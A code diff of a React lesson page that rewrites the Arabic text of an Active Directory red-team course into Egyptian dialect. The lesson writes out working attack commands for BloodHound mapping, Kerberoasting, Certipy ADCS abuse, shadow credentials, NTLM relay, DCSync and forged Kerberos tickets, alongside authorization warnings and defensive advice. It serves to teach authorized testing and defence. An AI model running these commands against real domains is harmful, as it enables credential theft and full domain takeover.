@@ -6,23 +6,23 @@ export default function Page() {
     <LessonShell slug="advanced-ad">
       <L
         ar={<>
-          <Section title="لماذا Active Directory هو الجائزة الكبرى؟">
-            <Analogy>الـ Domain Controller هو مفتاح المملكة. من يملك صلاحية Domain Admin أو krbtgt يملك كل الأجهزة و كل الحسابات في المؤسسة. هذا الدرس عن الطرق الحديثة للوصول لذلك المفتاح.</Analogy>
-            <Callout kind="danger" title="تحذير">كل التقنيات هنا مذكورة لتمارين red team مصرّح بها فقط. استخدامها بدون تفويض = جريمة فيدرالية في كل دول مجلس التعاون و الاتحاد الأوروبي و الولايات المتحدة.</Callout>
+          <Section title="ليه Active Directory هو الجائزة الكبرى؟">
+            <Analogy>الـ Domain Controller هو مفتاح المملكة. اللي معاه صلاحية Domain Admin أو الـ krbtgt، هو فعلياً مالك كل جهاز وكل حساب في الشركة. الدرس ده عن السكك الحديثة اللي بتوصلك للمفتاح ده.</Analogy>
+            <Callout kind="danger" title="تنبيه">كل التكنيكات هنا للتطبيق في تمارين red team معاك فيها إذن رسمي. تطبيقها على هدف من غير تفويض = جريمة فيدرالية، مش مزحة.</Callout>
           </Section>
-          <Section title="رسم شجرة الهجوم بـ BloodHound">
-            <p>أول ما يفعله red teamer داخل الدومين هو رسم خريطة العلاقات. BloodHound + SharpHound يجمعان كل ACLs, sessions, group memberships ثم يحوّلانها إلى رسم بياني.</p>
+          <Section title="ارسم شجرة الهجوم بـ BloodHound">
+            <p>أول حاجة بيعملها أي red teamer جوه الدومين: يرسم العلاقات. BloodHound + SharpHound بيلموا الـ ACLs والـ sessions وعضويات الجروبات كلها، وبيحولوها لجراف تقدر تمشي فيه بعينك من اليوزر بتاعك لحد Domain Admin.</p>
             <Terminal lines={[
               { p: "bloodhound-python -d corp.local -u user -p Pass1 -ns 10.0.0.10 -c All --zip" },
               { p: "Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -ZipFileName loot.zip" },
               { o: "[+] 1247 users, 92 computers, 38 GPOs collected" },
             ]} />
-            <h3>استعلامات Cypher مفيدة</h3>
+            <h3>استعلامات Cypher تستحق الحفظ</h3>
             <Code lang="Cypher">{`MATCH p=shortestPath((u:User {name:"ME@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
 MATCH (u:User {hasspn:true}) WHERE u.pwdlastset < (date().epochSeconds - 31536000) RETURN u.name
 MATCH (u)-[:GenericAll|WriteOwner|WriteDacl]->(t) RETURN u,t`}</Code>
           </Section>
-          <Section title="Kerberos Attacks الكاملة">
+          <Section title="ترسانة هجمات Kerberos كاملة">
             <h3>1) Kerberoasting</h3>
             <Code lang="bash">{`GetUserSPNs.py corp.local/user:Pass1 -dc-ip 10.0.0.10 -request -outputfile spns.hash
 hashcat -m 13100 spns.hash rockyou.txt -r rules/best64.rule`}</Code>
@@ -42,8 +42,8 @@ psexec.py -k -no-pass corp.local/Administrator@target.corp.local`}</Code>
 addcomputer.py corp.local/user:Pass1 -computer-name FAKE$ -computer-pass Fake1
 getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/FAKE$:Fake1`}</Code>
           </Section>
-          <Section title="ADCS — أحدث جبهة و أخطرها (ESC1 → ESC15)">
-            <p>Active Directory Certificate Services فيه قوالب شهادات يمكن إساءة تكوينها. أداة Certipy تكتشف و تستغل تلقائياً.</p>
+          <Section title="ADCS — الجبهة الأحدث والأخطر (ESC1 → ESC15)">
+            <p>Active Directory Certificate Services فيه قوالب شهادات سهل جداً يحصل فيها سوء تكوين. أداة Certipy بتلاقي الخروم دي وبتستغلها أوتوماتيك من غير ما تحتاج تعرق.</p>
             <Terminal lines={[
               { p: "certipy find -u user@corp.local -p Pass1 -dc-ip 10.0.0.10 -vulnerable -stdout" },
               { o: "[!] Vulnerable: VulnTemplate (ESC1) — ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU" },
@@ -52,43 +52,43 @@ getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/FAKE$
               { p: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10" },
               { o: "[+] Got TGT and NT hash for administrator: aad3b435...:31d6cfe0d16ae..." },
             ]} />
-            <h3>الـ ESC الأشهر</h3>
+            <h3>الـ ESC اللي هتقابلهم في الميدان</h3>
             <ul>
-              <li><b>ESC1</b> — قالب يسمح بـ SAN + Client Authentication.</li>
-              <li><b>ESC2</b> — Any Purpose EKU أو خالٍ.</li>
-              <li><b>ESC4</b> — GenericAll على القالب نفسه = استبدله بقالب ضعيف.</li>
-              <li><b>ESC8</b> — NTLM relay إلى الـ CA web enrollment.</li>
-              <li><b>ESC11</b> — RPC interface بدون EPA.</li>
-              <li><b>ESC13/15</b> — حديثة، تتعلق بـ issuance policies / schema.</li>
+              <li><b>ESC1</b> — قالب بيسمح بـ SAN + Client Authentication. أنت بتطلب شهادة باسم الأدمن وخلاص.</li>
+              <li><b>ESC2</b> — Any Purpose EKU أو EKU فاضي.</li>
+              <li><b>ESC4</b> — GenericAll على القالب نفسه = تعدّل عليه وتحوّله لقالب ضعيف بإيدك.</li>
+              <li><b>ESC8</b> — NTLM relay لواجهة CA web enrollment.</li>
+              <li><b>ESC11</b> — واجهة RPC من غير EPA.</li>
+              <li><b>ESC13/15</b> — جديدة، بتلعب على issuance policies والـ schema.</li>
             </ul>
           </Section>
-          <Section title="Shadow Credentials">
-            <p>لو كان لديك GenericWrite على حساب، يمكنك إضافة مفتاح msDS-KeyCredentialLink ثم المصادقة كهذا الحساب بـ PKINIT دون كسر كلمة مروره.</p>
+          <Section title="Shadow Credentials — تمشي من غير ما تكسر باسورد">
+            <p>لو معاك GenericWrite على حساب، تقدر تضيف له مفتاح msDS-KeyCredentialLink وتعمل مصادقة باسمه عن طريق PKINIT. الحساب باسوورده زي ما هو، إنت بس دخلت من باب جانبي.</p>
             <Code lang="bash">{`certipy shadow auto -u user@corp.local -p Pass1 -account victim`}</Code>
           </Section>
-          <Section title="NTLM Relay — هجوم لا يموت">
+          <Section title="NTLM Relay — الهجمة اللي مش بتموت">
             <Code lang="bash">{`responder -I eth0 -wrf
 ntlmrelayx.py -t ldaps://dc -smb2support --delegate-access
 ntlmrelayx.py -t ldap://dc --shadow-credentials --shadow-target victim$
 mitm6 -d corp.local
 ntlmrelayx.py -6 -wh fake-wpad -t ldaps://dc --delegate-access`}</Code>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الدفاع — Blue Team">
               <ul>
-                <li>فعّل SMB Signing + LDAP Signing &amp; Channel Binding (EPA).</li>
-                <li>عطّل LLMNR / NBT-NS / mDNS.</li>
-                <li>عطّل IPv6 إن لم يُستخدم، أو ثبّت DHCPv6 guard.</li>
-                <li>راقب 4624 type 3 + 4768/4769 غير المعتاد.</li>
+                <li>فعّل SMB Signing + LDAP Signing &amp; Channel Binding (EPA). دي البديهيات.</li>
+                <li>اقفل LLMNR / NBT-NS / mDNS. مفيش مبرر سنة 2026 إنهم شغالين.</li>
+                <li>اقفل IPv6 لو مش مستخدم، أو ركّب DHCPv6 guard.</li>
+                <li>راقب 4624 type 3 + 4768/4769 الغريبة. الباترن هو اللي هيكشفهم.</li>
               </ul>
             </Callout>
           </Section>
-          <Section title="DCSync و Golden / Silver / Diamond Tickets">
+          <Section title="DCSync والتذاكر الذهبية والفضية والماسية">
             <Code lang="bash">{`secretsdump.py -just-dc corp.local/admin:Pass1@DC1
 ticketer.py -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-... -domain corp.local administrator
 export KRB5CCNAME=administrator.ccache
 psexec.py -k -no-pass corp.local/administrator@DC1
 ticketer.py -nthash <SVC_NTLM> -spn cifs/target -domain corp.local user
 Rubeus.exe diamond /tgtdeleg /ticketuser:admin /ticketuserid:500 /groups:512`}</Code>
-            <Callout kind="warn" title="القاعدة الذهبية للدفاع">عند تأكيد اختراق DC: <b>دوّر krbtgt مرتين</b> (مرة، انتظر 10 ساعات، مرة أخرى).</Callout>
+            <Callout kind="warn" title="القاعدة الذهبية للمدافع">لما تتأكد إن الـ DC اتخرق: <b>دوّر krbtgt مرتين</b> (مرة، استنى 10 ساعات، تاني مرة). مرة واحدة مش كفاية، المهاجم لسة معاه التذكرة القديمة شغالة.</Callout>
           </Section>
         </>}
         en={<>
